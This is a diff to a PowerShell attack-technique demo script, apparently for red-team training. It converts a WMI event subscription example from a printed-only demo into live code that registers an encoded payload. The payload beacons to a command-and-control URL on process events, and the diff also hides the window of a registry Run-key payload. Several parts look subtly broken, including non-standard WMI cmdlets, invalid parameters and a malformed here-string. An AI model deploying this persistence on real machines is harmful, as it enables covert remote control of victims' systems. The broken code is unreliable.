@@ -328,8 +328,8 @@ function Show-RegistryPersistence {
     # - Create a marker file on the user's Desktop called 'HI.txt'
     $payload = @"
     try {
-        Invoke-RestMethod -Uri '$Global:C2Url/?message=hi&session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
-        Add-Content -Path '$desktopPath\HI.txt' -Value 'Successfully executed payload via Reg Run Key.' -ErrorAction SilentlyContinue
+        Invoke-RestMethod -Uri '$Global:C2Url/?message=hi&session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue -NoNewWindow -WindowStyle Hidden
+        Add-Content -Path '$desktopPath\HI.txt' -Value 'Successfully executed payload via Reg Run Key.' -ErrorAction SilentlyContinue -NoNewWindow -WindowStyle Hidden
     } catch { }
 "@
 
@@ -438,20 +438,65 @@ function Undo-LiveChanges {
 }
 
 function Show-WMIEventSub {
-    Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
+    $WmiNamespace = "root\subscription"
 
     if ($Global:DemoMode) {
+        Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
         Write-Host "    [*] WMI subscriptions allow code execution without files:" -ForegroundColor Gray
         Write-Host "    [*] - Event Filter: Defines trigger condition" -ForegroundColor Gray
         Write-Host "    [*] - Event Consumer: Defines action (PowerShell command)" -ForegroundColor Gray
         Write-Host "" 
         Write-Host "    [DEMO] Example command that WOULD be used (not executed):" -ForegroundColor Yellow
-        Write-Host "    $EventFilter = New-WmiEventFilter -Name 'EventSubscription' -Query 'SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \\"Win32_Process\\"'" -ForegroundColor DarkGray
+        Write-Host "    $EventFilter = New-WmiEventFilter -Name 'EventSubscription' -Query 'SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \\\"Win32_Process\\\"'" -ForegroundColor DarkGray
         Write-Host "    $EventConsumer = New-WmiEventConsumer -Name 'EventSubscription' -ScriptText 'powershell.exe -EncodedCommand <base64_payload>'" -ForegroundColor DarkGray
         Write-Host "" 
         Write-Host "    [DEMO] This technique is a key detection target for Blue Team!" -ForegroundColor Yellow
+    } else {
+        Write-Host "[+] Technique 6: WMI Event Subscription (LIVE EXECUTION)" -ForegroundColor Green
+        
+        # --- Configuration ---
+    $payload = @"
+        try {
+            Invoke-RestMethod -Uri '$Global:C2Url/?message=how-are-you-session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
+            Add-Content -Path '$desktopPath\calcLOG.txt' -Value 'Successfully executed payload via WMI.' -ErrorAction SilentlyContinue
+        } catch { }
+    "@
+
+        $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+        $EventName = "EventSubscription"
+        
+        # 1. Create the Event Filter (What triggers the action)
+        Write-Host "    [1/3] Creating WMI Event Filter..." -ForegroundColor Cyan
+        $EventFilter = New-WmiEventFilter -Name $EventName -Query "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \\\"Win32_Process\\\""
+        
+        # 2. Create the Event Consumer (What the action is)
+        Write-Host "    [2/3] Creating WMI Event Consumer..." -ForegroundColor Cyan
+        $EventConsumer = New-WmiEventConsumer -Name $EventName -ScriptText "powershell.exe -EncodedCommand $EncodedPayload"
+        
+        # 3. Register the Subscription (Linking Filter and Consumer)
+        Write-Host "    [3/3] Registering WMI Event Subscription..." -ForegroundColor Cyan
+        $Subscription = Register-WmiEventSubscriber -Name $EventName -Filter $EventFilter -Consumer $EventConsumer
+        
+        if ($Subscription) {
+            Write-Host "[+] WMI Event Subscription successfully registered." -ForegroundColor Green
+            Write-Host "    [*] If a new process starts, the payload will execute." -ForegroundColor Green
+            Write-Host "[*] Running a test process to verify subscription..." -ForegroundColor Yellow
+            
+            # --- Test Execution (optional, but helpful for a demo) ---
+            Start-Process calc.exe -NoNewWindow
+            
+            # Wait a moment for the event to fire
+            Start-Sleep -Seconds 2
+            
+            # Cleanup
+            Unregister-WmiEventSubscriber -Name $EventName
+            Write-Host "[+] Cleaned up WMI subscription." -ForegroundColor Green
+        } else {
+            Write-Error "[!] Failed to register WMI Event Subscription."
+        }
     }
 }
+
 function Show-ProcessHollowing {
     Write-Host "[+] Technique 7: Process Hollowing Concept" -ForegroundColor Green
     
